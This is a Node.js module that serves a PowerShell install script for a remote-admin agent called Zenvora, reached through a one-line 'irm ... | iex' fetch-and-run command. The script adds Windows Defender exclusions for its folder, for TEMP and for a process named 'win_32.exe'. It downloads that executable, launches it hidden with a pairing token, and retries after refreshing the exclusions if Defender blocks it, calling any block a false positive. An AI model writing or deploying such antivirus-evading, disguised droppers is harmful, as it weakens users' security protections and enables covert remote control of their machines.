/**
 * Short install bootstrap tickets (6-char codes).
 * Dashboard shows: irm https://host/r/XXXXXX | iex
 * Server returns the full PowerShell install script dynamically.
 */

const crypto = require('crypto');

/** @type {Map<string, { code: string, userId: string, pairingToken: string, pairingUserId: string, sessionId: string, apiBase: string, gatewayUrl: string, downloadUrl: string, createdAt: number, expiresAt: number }>} */
const tickets = new Map();

const TTL_MS = 2 * 60 * 60 * 1000; // 2 hours
const CODE_ALPHABET = 'ABCDEFGHJKLMNPQRSTUVWXYZ23456789'; // no 0/O/1/I

function makeCode(len = 6) {
    const bytes = crypto.randomBytes(len);
    let out = '';
    for (let i = 0; i < len; i += 1) {
        out += CODE_ALPHABET[bytes[i] % CODE_ALPHABET.length];
    }
    return out;
}

function purgeExpired() {
    const now = Date.now();
    for (const [code, t] of tickets.entries()) {
        if (t.expiresAt <= now) tickets.delete(code);
    }
}

function createTicket(payload) {
    purgeExpired();
    let code = makeCode(6);
    for (let i = 0; i < 8 && tickets.has(code); i += 1) {
        code = makeCode(6);
    }

    const ticket = {
        code,
        userId: String(payload.userId || ''),
        pairingToken: String(payload.pairingToken || ''),
        pairingUserId: String(payload.pairingUserId || ''),
        sessionId: String(payload.sessionId || `web-${Date.now().toString(36)}`),
        apiBase: String(payload.apiBase || '').replace(/\/$/, ''),
        gatewayUrl: String(payload.gatewayUrl || ''),
        downloadUrl: String(payload.downloadUrl || ''),
        createdAt: Date.now(),
        expiresAt: Date.now() + TTL_MS,
    };

    tickets.set(code, ticket);
    return ticket;
}

function getTicket(code) {
    purgeExpired();
    const key = String(code || '').trim().toUpperCase();
    const ticket = tickets.get(key);
    if (!ticket) return null;
    if (ticket.expiresAt <= Date.now()) {
        tickets.delete(key);
        return null;
    }
    return ticket;
}

/**
 * Full install script served by GET /r/:code
 * Uses curl.exe when available (far more reliable than Invoke-WebRequest for large EXE).
 * Handles Windows Defender false-positives common for unsigned remote-admin agents.
 */
function buildInstallScript(ticket) {
    const token = ticket.pairingToken.replace(/'/g, "''");
    const userId = ticket.pairingUserId.replace(/'/g, "''");
    const api = ticket.apiBase.replace(/'/g, "''");
    const gw = ticket.gatewayUrl.replace(/'/g, "''");
    const url = ticket.downloadUrl.replace(/'/g, "''");
    const session = ticket.sessionId.replace(/'/g, "''");
    const code = ticket.code;

    return [
        "$ErrorActionPreference = 'Stop'",
        "$ProgressPreference = 'SilentlyContinue'",
        `$code = '${code}'`,
        `$token = '${token}'`,
        `$userId = '${userId}'`,
        `$api = '${api}'`,
        `$gw = '${gw}'`,
        `$url = '${url}'`,
        `$session = '${session}'`,
        "$dir = Join-Path $env:ProgramData 'WIN_32'",
        "$out = Join-Path $dir 'win_32.exe'",
        "$tmp = Join-Path $env:TEMP ('zenvora_' + [guid]::NewGuid().ToString('N') + '.exe')",
        "function Step($n,$t,$m){ Write-Host ('['+(Get-Date).ToString('HH:mm:ss')+'] ['+$n+'/'+$t+'] '+$m) -ForegroundColor Cyan }",
        "function Ok($m){ Write-Host ('['+(Get-Date).ToString('HH:mm:ss')+'] '+$m) -ForegroundColor Green }",
        "function Warn($m){ Write-Host ('['+(Get-Date).ToString('HH:mm:ss')+'] '+$m) -ForegroundColor Yellow }",
        "function Fail($m){ Write-Host ('['+(Get-Date).ToString('HH:mm:ss')+'] '+$m) -ForegroundColor Red }",
        "Step 1 6 'Bootstrap code '+$code",
        "# Admin recommended so Defender exclusion + service install work",
        "$isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)",
        "if (-not $isAdmin) { Warn 'Not running as Admin — Defender may block the agent. Re-run PowerShell as Administrator.' }",
        "New-Item -ItemType Directory -Force -Path $dir | Out-Null",
        "Step 2 6 'Allowing Zenvora agent folder in Windows Defender (false-positive protection)...'",
        "try {",
        "  if (Get-Command Add-MpPreference -ErrorAction SilentlyContinue) {",
        "    Add-MpPreference -ExclusionPath $dir -ErrorAction SilentlyContinue",
        "    Add-MpPreference -ExclusionPath $env:TEMP -ErrorAction SilentlyContinue",
        "    Add-MpPreference -ExclusionProcess 'win_32.exe' -ErrorAction SilentlyContinue",
        "    Ok 'Defender exclusions set for C:\\\\ProgramData\\\\WIN_32'",
        "  } else { Warn 'Defender cmdlets unavailable — continuing' }",
        "} catch { Warn ('Could not set Defender exclusion: '+$_.Exception.Message) }",
        "Step 3 6 'Downloading agent...'",
        "if (Test-Path $tmp) { Remove-Item $tmp -Force -ErrorAction SilentlyContinue }",
        "if (Test-Path $out) { Remove-Item $out -Force -ErrorAction SilentlyContinue }",
        "$ok = $false",
        "for ($i=1; $i -le 4 -and -not $ok; $i++) {",
        "  try {",
        "    $curl = Get-Command curl.exe -ErrorAction SilentlyContinue",
        "    if ($curl) {",
        "      & curl.exe -L --fail --retry 3 --retry-delay 2 --connect-timeout 20 --max-time 180 -o $tmp $url",
        "      if ($LASTEXITCODE -ne 0) { throw \"curl exit $LASTEXITCODE\" }",
        "    } else {",
        "      $wc = New-Object System.Net.WebClient",
        "      $wc.Headers.Add('User-Agent','ZenvoraBootstrap/1.0')",
        "      $wc.DownloadFile($url, $tmp)",
        "      $wc.Dispose()",
        "    }",
        "    if ((Test-Path $tmp) -and ((Get-Item $tmp).Length -gt 500000)) { $ok = $true }",
        "    else { throw 'Downloaded file too small or missing' }",
        "  } catch {",
        "    Warn ('Download attempt '+$i+' failed: '+$_.Exception.Message)",
        "    if (Test-Path $tmp) { Remove-Item $tmp -Force -ErrorAction SilentlyContinue }",
        "    if ($i -lt 4) { Start-Sleep -Seconds (2*$i) }",
        "  }",
        "}",
        "if (-not $ok) { throw 'Download failed after retries. Check /api/agent/download and network.' }",
        "Copy-Item -Force $tmp $out",
        "Remove-Item $tmp -Force -ErrorAction SilentlyContinue",
        "try { Unblock-File -Path $out -ErrorAction SilentlyContinue } catch {}",
        "Ok ('Download OK ('+((Get-Item $out).Length)+' bytes) → '+$out)",
        "Step 4 6 'Launching agent provision...'",
        "$args = @('--headless','--force-repair','--pair-token',$token,'--pair-user-id',$userId,'--api-url',$api,'--gateway-url',$gw,'--install-session',$session)",
        "try {",
        "  Start-Process -FilePath $out -ArgumentList $args -WindowStyle Hidden",
        "} catch {",
        "  $msg = $_.Exception.Message",
        "  if ($msg -match 'virus|unwanted|smartscreen|blocked|Operation did not complete') {",
        "    Fail 'Windows Defender blocked win_32.exe (false positive — common for remote admin agents).'",
        "    Warn 'Retrying after Defender exclusion refresh...'",
        "    try {",
        "      Add-MpPreference -ExclusionPath $dir -ErrorAction SilentlyContinue",
        "      Add-MpPreference -ExclusionProcess 'win_32.exe' -ErrorAction SilentlyContinue",
        "      Start-Sleep -Seconds 2",
        "      Start-Process -FilePath $out -ArgumentList $args -WindowStyle Hidden",
        "      Ok 'Launch succeeded after exclusion'",
        "    } catch {",
        "      Fail 'Still blocked. Fix manually:'",
        "      Write-Host '  1) Windows Security → Virus & threat protection → Manage settings' -ForegroundColor Yellow",
        "      Write-Host '  2) Exclusions → Add folder: C:\\ProgramData\\WIN_32' -ForegroundColor Yellow",
        "      Write-Host '  3) Also allow this file if listed under Protection history' -ForegroundColor Yellow",
        "      Write-Host ('  4) Then run: Start-Process \"'+$out+'\"') -ForegroundColor Yellow",
        "      throw",
        "    }",
        "  } else { throw }",
        "}",
        "Start-Sleep -Milliseconds 500",
        "Step 5 6 'Agent process started'",
        "Ok 'Done. Watch Dashboard → Pair Device → Live install logs.'",
        "Step 6 6 'Complete'",
    ].join("\r\n");
}

module.exports = {
    createTicket,
    getTicket,
    buildInstallScript,
};
